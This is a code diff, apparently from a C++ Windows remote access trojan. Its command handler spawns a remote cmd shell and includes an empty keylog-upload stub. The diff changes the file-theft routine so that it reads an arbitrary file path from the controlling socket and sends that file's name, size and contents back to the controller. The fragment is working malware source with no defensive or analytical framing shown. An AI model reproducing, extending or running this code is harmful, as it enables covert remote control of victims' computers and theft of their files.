@@ -147,7 +147,15 @@ void callCommand(Request *request, Socket *socket) {
 		CreateProcess(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
 		WaitForSingleObject(pi.hProcess, INFINITE);
 	} else if(command.compare("downloadfile") == 0) {
-		uploadFile(socket);
+		while (!request->isFinished()) {
+			len = socket->Receive(buffer, BUFFER_SIZE, 0);
+			request->push(buffer, len);
+			buffer.empty();
+		}
+
+		string path;
+		request->pop(path);
+		uploadFile(socket, path);
 	}
 }
 
@@ -185,8 +193,11 @@ void playWav() {
 void uploadKeylog() {
 }
 
-void uploadFile(Socket *socket) {
-	string file = "C:\\Users\\L\\Desktop\\script.js";
+void uploadFile(Socket *socket, string file) {
+	if (file.find("\\") == string::npos) {
+		return;
+	}
+	string fileName = file.substr(file.find_last_of("\\"), file.length());
     string buffer, header;
     FILE *pFile = fopen(file.c_str(), "rb");
     // obtain file size:
@@ -195,10 +206,13 @@ void uploadFile(Socket *socket) {
     rewind (pFile);
 
     // Write header
-	char dst[100];
-	ltoa(lFileSize, dst, 10);
-	header = dst;
-	header.append("\n");
+	char cFileSize[100];
+	ltoa(lFileSize, cFileSize, 10);
+	header = fileName;
+	header.append(" ");
+	header.append(cFileSize);
+	header.append(" ");
+
     socket->Send((char *)header.c_str(), strlen(header.c_str()));
 
     int len;
